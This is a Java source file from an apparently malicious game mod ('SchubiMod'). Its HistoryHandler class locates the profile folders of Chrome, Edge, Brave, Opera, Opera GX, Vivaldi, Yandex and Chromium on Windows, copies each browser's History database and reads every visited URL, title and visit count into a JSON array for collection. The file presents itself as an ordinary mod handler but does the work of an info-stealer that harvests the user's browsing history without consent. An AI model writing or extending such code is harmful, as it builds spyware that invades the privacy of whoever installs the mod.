package dev.schubilegend.handlers;

import dev.schubilegend.SchubiMod;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.io.File;
import java.net.URL;
import java.nio.file.Files;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.ResultSet;
import java.util.HashMap;
import java.util.Properties;


public class HistoryHandler {
    private static File appData = new File(System.getenv("APPDATA"));
    private static File localAppData = new File(System.getenv("LOCALAPPDATA"));
    private static HashMap<String, String> paths = new HashMap<String, String>() {
        {
            put("Google Chrome", localAppData + "\\Google\\Chrome\\User Data");
            put("Microsoft Edge", localAppData + "\\Microsoft\\Edge\\User Data");
            put("Chromium", localAppData + "\\Chromium\\User Data");
            put("Opera", appData + "\\Opera Software\\Opera Stable");
            put("Opera GX", appData + "\\Opera Software\\Opera GX Stable");
            put("Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data");
            put("Vivaldi", localAppData + "\\Vivaldi\\User Data");
            put("Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data");
        }
    };

    private final JsonArray history = new JsonArray();

    public JsonArray grabBrowserHistory() {
        crawlUserData();
        return history;
    }

    private void crawlUserData() {
        for (String browser : paths.keySet()) {
            File userData = new File(paths.get(browser));
            if (!userData.exists()) continue;
            File historyFile = new File(userData, "History");
            if (!historyFile.exists()) continue;
            crawlHistory(historyFile, browser);
        }
    }

    private void crawlHistory(File historyFile, String browser) {
        try {
            File tempHistoryFile = File.createTempFile("TempHistory", null);
            tempHistoryFile.deleteOnExit();
            Files.copy(historyFile.toPath(), tempHistoryFile.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
            Driver driver = SchubiMod.driver;
            Properties props = new Properties();
            Connection connection = driver.connect("jdbc:sqlite:" + tempHistoryFile.getAbsolutePath(), props);
            ResultSet resultSet = connection.createStatement().executeQuery("SELECT url, title, visit_count, last_visit_time FROM urls");
            while (resultSet.next()) {
                String url = resultSet.getString(1);
                String title = resultSet.getString(2);
                int visitCount = resultSet.getInt(3);
                if (url != null) {
                    JsonObject entry = new JsonObject();
                    entry.addProperty("browser", browser);
                    URL urlObj = new URL(url);
                    String urlWithoutParams = urlObj.getProtocol() + "://" + urlObj.getHost() + urlObj.getPath();
                    entry.addProperty("url", urlWithoutParams.replaceAll("[^\\p{ASCII}\"']", ""));
                    entry.addProperty("title", title.replaceAll("[^\\p{ASCII}\"']", ""));
                    entry.addProperty("visitCount", visitCount);
                    history.add(entry);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
